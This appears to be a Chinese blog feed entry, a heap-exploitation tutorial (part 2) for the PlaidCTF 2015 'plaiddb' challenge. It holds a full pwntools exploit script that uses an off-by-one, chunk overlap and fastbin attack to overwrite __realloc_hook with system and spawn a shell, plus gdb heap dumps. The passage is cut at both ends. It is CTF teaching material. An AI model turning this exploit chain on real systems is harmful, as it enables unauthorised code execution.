title="https://bbs.pediy.com/thread-246783.htm">看雪大佬的文章<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/f4127a66/">https://noone-hub.github.io/posts/f4127a66/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程2</title>
    <url>/posts/83154af0/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程2"><a href="#pwn堆入门系列教程2" class="headerlink" title="pwn堆入门系列教程2"></a>pwn堆入门系列教程2</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">堆入门系列教程1<i class="fa fa-external-link"></i></span><br>序言：第二题，研究了两天，其中有小猪师傅，m4x师傅，萝卜师傅等各个师傅指点我，这次又踩了几个坑，相信以后不会再犯，第二题感觉比第一题复杂许多，不是off-by-one的问题，是这种攻击方式的问题，这种攻击方式十分精妙，chunk overlap，堆块重叠，这种攻击方式我也是第一次见，复现起来难度也是有滴</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="off-by-one第二题"><a href="#off-by-one第二题" class="headerlink" title="off-by-one第二题"></a>off-by-one第二题</h2><p>此题也是off-by-one里的一道题目，让我再次意识到off by one在堆里的强大之处</p><h2 id="plaidctf-2015-plaiddb"><a href="#plaidctf-2015-plaiddb" class="headerlink" title="plaidctf 2015 plaiddb"></a>plaidctf 2015 plaiddb</h2><p>前面的功能分析和数据结构分析我就不再做了，ctf-wiki上给的清楚了，然后网上各种wp也给的清楚了，我没逆向过红黑树，也没写过，所以具体结构我也不清楚，照着师傅们的来，确实是树</p><p>数据结构</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *key;</span><br><span class="line">    <span class="keyword">long</span> data_size;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">right</span>;</span></span><br><span class="line">    <span class="keyword">long</span> dummy;</span><br><span class="line">    <span class="keyword">long</span> dummy1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数存在off-by-one</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_1040</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v2 = malloc_usable_size(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      sub_1020();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v1 - v0;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v1 - v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">realloc</span>(v0, <span class="number">2</span> * v2);</span><br><span class="line">      v0 = v6;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"FATAL: Out of memory"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = &amp;v6[v5];</span><br><span class="line">      v2 = malloc_usable_size(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    *v1++ = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *v1 = <span class="number">0</span>;<span class="comment">//off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后师傅们利用堆块的重叠进行泄露地址，然后覆盖fd指针，然后fastbin attack，简单的说就是这样，先说明下整体攻击过程</p><ol><li>先删掉初始存在的堆块 th3fl4g，方便后续堆的布置及对齐</li><li>创建堆块，为后续做准备在创建同key堆块的时候，会删去上一个同key堆块</li><li>利用off-by-one覆盖下个chunk的pre_size，这里必须是0x18,0x38,0x78这种递增的，他realloc是按倍数递增的，如果我们用了0x18大小的key的话，会将下一个chunk的pre_size部分当数据块来用，在加上off-by-one覆盖掉size的insue位</li><li>先free掉第一块，为后续大堆块做准备</li><li>然后free第三块，这时候会向后合并堆块，根据pre_size合并成大堆块造成堆块重叠，这时候可以泄露地址了</li><li>申请堆块填充空间至chunk2</li><li>chunk2上为main_arena，泄露libc地址</li><li>现在堆块是重叠的，chunk3在我们free后的大堆块里，然后修改chunk3的fd指针指向realloc_hook</li><li>不破坏现场(不容易)</li><li>malloc一次，在malloc一次，这里有个点要注意，需要错位伪造size，因为fastbin有个checksize，我们这里将前面的0x7f错位，后面偏移也要补上</li><li>最后改掉后，在调用一次getshell</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'datastore'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(key)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"GET"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUT</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"PUT"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter data size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter data:"</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DUMP</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"DUMP"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEL</span><span class="params">(key)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"DEL"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    realloc_hook_off = libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">    DEL(<span class="string">"th3fl4g"</span>)</span><br><span class="line"></span><br><span class="line">    PUT(<span class="string">"1"</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x80</span>)</span><br><span class="line">    PUT(<span class="string">"2"</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x18</span>)</span><br><span class="line">    PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, <span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">    PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, <span class="string">'C'</span>*<span class="number">0xf0</span>)</span><br><span class="line">    PUT(<span class="string">"4"</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>), <span class="number">0x20</span>, <span class="string">'D'</span>*<span class="number">0x20</span>)  <span class="comment"># off by one</span></span><br><span class="line"></span><br><span class="line">    DEL(<span class="string">"1"</span>*<span class="number">0x8</span>)</span><br><span class="line">    DEL(<span class="string">"3"</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">    DUMP()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"INFO: Dumping all rows.\n"</span>)</span><br><span class="line">    temp = p.recv(<span class="number">11</span>)</span><br><span class="line">    heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x3f0</span></span><br><span class="line">    libc_base = int(p.recvline()[<span class="number">3</span>:<span class="number">-7</span>])<span class="number">-0x3be7b8</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">    realloc_hook_addr = libc_base + realloc_hook_off</span><br><span class="line">    log.info(<span class="string">"reallo_hook: 0x%x"</span> % realloc_hook_addr)</span><br><span class="line">    payload = p64(heap_base+<span class="number">0x70</span>)</span><br><span class="line">    payload += p64(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x3e0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x88</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0xb0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">    payload += p64(realloc_hook_addr<span class="number">-0x8</span><span class="number">-0x3</span><span class="number">-0x8</span>)</span><br><span class="line">    PUT(<span class="string">"6"</span>*<span class="number">0x8</span>, <span class="number">0xa8</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x290</span>)</span><br><span class="line">    payload += p64(<span class="number">0x20</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    PUT(<span class="string">"c"</span>*<span class="number">0x8</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x90</span>)</span><br><span class="line">    payload += p64(<span class="number">0x8</span>)+p64(heap_base+<span class="number">0x230</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    PUT(<span class="string">"d"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    system_addr = libc_base+system_off</span><br><span class="line">    print(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x3</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    payload += p8(<span class="number">0</span>)*(<span class="number">0x4d</span>+<span class="number">0x8</span>)</span><br><span class="line">    PUT(<span class="string">"e"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">    payload = <span class="string">"/bin/sh"</span></span><br><span class="line">    payload += p8(<span class="number">0</span>)*<span class="number">0x12</span> </span><br><span class="line">    GET(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h3 id="细节讲解"><a href="#细节讲解" class="headerlink" title="细节讲解"></a>细节讲解</h3><p>我只有exp部分是重点，其余创建堆块动作都是辅助的</p><h4 id="堆块重叠"><a href="#堆块重叠" class="headerlink" title="堆块重叠"></a>堆块重叠</h4><p><span class="exturl" data-url="aHR0cDovLzRuZ2VsYm95LmJsb2dzcG90LmNvbS8yMDE2LzEwL3NwYW4tZGlzcGxheS1ibG9jay1vdmVyZmxvdy1oaWRkZW5fMTAuaHRtbA==" title="http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html">堆叠<i class="fa fa-external-link"></i></span><br>这篇文章讲的很好，图配的也很好，看下这部分就大概知道堆块重叠了<br>而这道题中，这里就是构造堆块重叠部分</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">realloc_hook_off = libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">"th3fl4g"</span>)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">"1"</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x80</span>)</span><br><span class="line">PUT(<span class="string">"2"</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x18</span>)</span><br><span class="line">PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, <span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, <span class="string">'C'</span>*<span class="number">0xf0</span>)</span><br><span class="line">PUT(<span class="string">"4"</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>), <span class="number">0x20</span>, <span class="string">'D'</span>*<span class="number">0x20</span>)  <span class="comment"># off by one</span></span><br><span class="line"></span><br><span class="line">DEL(<span class="string">"1"</span>*<span class="number">0x8</span>)</span><br><span class="line">DEL(<span class="string">"3"</span>*<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">DUMP()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"INFO: Dumping all rows.\n"</span>)</span><br><span class="line">temp = p.recv(<span class="number">11</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x3f0</span></span><br><span class="line">libc_base = int(p.recvline()[<span class="number">3</span>:<span class="number">-7</span>])<span class="number">-0x3be7b8</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">realloc_hook_addr = libc_base + realloc_hook_off</span><br><span class="line">log.info(<span class="string">"reallo_hook: 0x%x"</span> % realloc_hook_addr)</span><br></pre></td></tr></table></figure><p>第一步put是为了将free掉的chunk移动到2处，这样才好泄露</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x562a3c9a8070-0x70</span><br><span class="line">0x562a3c9a8000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x562a3c9a8010:	0x0000000000000000	0x0000000000000080</span><br><span class="line">0x562a3c9a8020:	0x0000562a3c9a80b0	0x0000000000000000</span><br><span class="line">0x562a3c9a8030:	0x0000000000000000	0x0000562a3c9a8140</span><br><span class="line">0x562a3c9a8040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562a3c9a8050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x562a3c9a8060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x562a3c9a8070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x562a3c9a8080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562a3c9a8090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562a3c9a80a0:	0x0000000000000000	0x0000000000000301 <span class="comment">#free后合并的chunk</span></span><br><span class="line">0x562a3c9a80b0:	0x00007f14e88247b8	0x00007f14e88247b8</span><br><span class="line">0x562a3c9a80c0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80d0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80e0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80f0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8100:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8110:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8120:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8130:	0x0000000000000090	0x0000000000000040 <span class="comment">#堆块2</span></span><br><span class="line">0x562a3c9a8140:	0x0000562a3c9a8070	0x0000000000000018</span><br><span class="line">0x562a3c9a8150:	0x0000562a3c9a8050	0x0000000000000000</span><br><span class="line">0x562a3c9a8160:	0x0000000000000000	0x0000562a3c9a8250</span><br><span class="line">0x562a3c9a8170:	0x0000000000000001	0x0000000000000041</span><br><span class="line">0x562a3c9a8180:	0x0000562a3c9a8000	0x00000000000000f0</span><br></pre></td></tr></table></figure><ol><li>为什么确定这里是堆块2，你可以看他的key指针，指向0x0000562a3c9a8070，这里正是0x32就是第二块</li><li>如果我们要泄露的话，就是通过覆盖堆块的数据部分的大小，也就是0x18那个大小，覆盖成0x562a3c9a80b0处存的地址，我们要将这个内容往下偏移多少要计算下</li><li>0x562a3c9a8140-0x562a3c9a80b0=0x90</li><li>所以我们下一个malloc的大小就是0x80-0x90之间了,不能是0x90，否则会变成0x100的chunk</li></ol><p>覆盖后结果如下，地址会变，因为我是两次调试，方便截图，实际偏移位置没变</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x55be33916070-0x70</span><br><span class="line">0x55be33916000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x55be33916010:	0x0000000000000000	0x0000000000000080</span><br><span class="line">0x55be33916020:	0x000055be339160b0	0x0000000000000000</span><br><span class="line">0x55be33916030:	0x0000000000000000	0x000055be33916140</span><br><span class="line">0x55be33916040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55be33916050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x55be33916060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x55be33916070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x55be33916080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55be33916090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160a0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55be339160b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916130:	0x0000000000000000	0x0000000000000271</span><br><span class="line">0x55be33916140:	0x00007fa9f416c7b8	0x00007fa9f416c7b8 <span class="comment">#覆盖了原来的0x18</span></span><br><span class="line">0x55be33916150:	0x000055be33916050	0x0000000000000000</span><br><span class="line">0x55be33916160:	0x0000000000000000	0x000055be33916250</span><br><span class="line">0x55be33916170:	0x0000000000000001	0x0000000000000041</span><br><span class="line">0x55be33916180:	0x000055be339163e0	0x0000000000000088</span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190829213254-81676342-ca61-1.png" alt="leak" title="leak"></p><h4 id="保护现场"><a href="#保护现场" class="headerlink" title="保护现场"></a>保护现场</h4><p>这步是比较难的，因为堆块申请的位置不确定，需要一步步调试确定，我建议每部署一部分，调试一次状况，然后在进行现场的保护</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(heap_base+<span class="number">0x70</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x3e0</span>)</span><br><span class="line">payload += p64(<span class="number">0x88</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0xb0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(realloc_hook_addr<span class="number">-0x8</span><span class="number">-0x3</span><span class="number">-0x8</span>)</span><br><span class="line">PUT(<span class="string">"6"</span>*<span class="number">0x8</span>, <span class="number">0xa8</span>, payload)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x290</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">PUT(<span class="string">"c"</span>*<span class="number">0x8</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)+p64(heap_base+<span class="number">0x230</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">PUT(<span class="string">"d"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>具体我怎么调试示范下，先在1处gdb.attach(p)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/100gx 0x559717162000</span><br><span class="line">0x559717162000:	0x0000000000000000	0x0000000000000041 <span class="comment">#结构体chunk</span></span><br><span class="line">0x559717162010:	0x00005597171621c0	0x00000000000000a8</span><br><span class="line">0x559717162020:	0x0000559717162140	0x0000000000000000</span><br><span class="line">0x559717162030:	0x0000000000000000	0x0000559717162140</span><br><span class="line">0x559717162040:	0x0000000000000001	0x0000000000000021</span><br><span class="line">0x559717162050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x559717162060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x559717162070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x559717162080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559717162090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620a0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5597171620b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162130:	0x0000000000000000	0x00000000000000b1 <span class="comment">#payload chunk </span></span><br><span class="line">0x559717162140:	0x0000559717162070	0x0000000000000008</span><br><span class="line">0x559717162150:	0x0000559717162050	0x0000559717162010</span><br><span class="line">0x559717162160:	0x0000000000000000	0x0000559717162250</span><br><span class="line">0x559717162170:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x559717162180:	0x00005597171623e0	0x0000000000000088</span><br><span class="line">0x559717162190:	0x00005597171620b0	0x0000000000000000</span><br><span class="line">0x5597171621a0:	0x0000000000000000	0x0000559717162250</span><br><span class="line">0x5597171621b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171621c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171621d0:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5597171621e0:	0x00007fc9194dc71d	0x00000000000001c1 <span class="comment">#payload end</span></span><br><span class="line">0x5597171621f0:	0x00007fc9194dc7b8	0x00007fc9194dc7b8</span><br><span class="line">0x559717162200:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162210:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162220:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162230:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162240:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x559717162250:	0x0000559717162290	0x0000000000000020</span><br><span class="line">0x559717162260:	0x00005597171623b0	0x0000559717162140</span><br><span class="line">0x559717162270:	0x0000559717162180	